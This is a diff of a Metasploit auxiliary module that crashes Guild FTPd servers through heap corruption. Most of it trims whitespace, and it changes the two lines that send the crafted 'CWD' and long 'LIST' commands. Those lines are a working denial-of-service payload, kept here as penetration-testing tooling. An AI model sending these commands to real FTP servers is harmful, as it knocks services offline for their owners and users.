@@ -3,10 +3,10 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/ 
+# http://metasploit.com/framework/
 ##
 
 require 'msf/core'
@@ -15,9 +15,9 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Ftp
 	include Msf::Auxiliary::Dos
-	
+
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Guild FTPd 0.999.8.11/0.999.14 Heap Corruption',
 			'Description'    => %q{
 				Guild FTPd 0.999.8.11 and 0.999.14 are vulnerable
@@ -48,8 +48,8 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Sending commands...")
 
 		# We want to try to wait for responses to these
-		raw_send_recv("CWD #{'/.' * 124}\r\n")
-		raw_send_recv("LIST #{'X' * 100}\r\n")
+		resp = send_cmd(['CWD', '/.' * 124])
+		resp = send_cmd(['LIST', 'X' * 100])
 
 		disconnect
 	end
